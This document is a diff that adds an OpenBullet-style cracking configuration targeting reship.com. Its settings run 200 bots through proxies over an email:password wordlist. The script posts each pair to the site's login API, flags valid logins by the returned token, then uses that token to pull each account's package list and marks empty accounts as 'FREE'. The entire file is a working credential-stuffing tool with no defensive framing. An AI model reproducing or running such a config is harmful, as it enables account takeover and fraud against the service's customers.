@@ -1,0 +1,66 @@
+[SETTINGS]
+{
+  "Name": "Reship",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-01T06:31:03.0805996-05:00",
+  "AdditionalInfo": "",
+  "Author": "Hestia",
+  "Version": "1.2.8 Anomaly",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION CurrentUnixTime -> VAR "STAMP" 
+
+FUNCTION RandomString "?d?d?d" -> VAR "STAMPEND" 
+
+REQUEST POST "https://www.reship.com/rest/api/1/auth?timestamp=<STAMP><STAMPEND>" 
+  CONTENT "{\"emailAddress\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Host: www.reship.com" 
+  HEADER "Origin: https://www.reship.com" 
+  HEADER "Referer: https://www.reship.com/" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "Please supply an email address and password" 
+    KEY "Your email address was not found" 
+    KEY "Invalid password" 
+  KEYCHAIN Success OR 
+    KEY "token\":\"" 
+
+PARSE "<SOURCE>" JSON "token" -> VAR "TOKEN" 
+
+REQUEST GET "https://www.reship.com/rest/api/1/packages" 
+  
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+PARSE "<SOURCE>" LR "[" "]" -> CAP "Packages" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<Packages>" EqualTo "" 
+
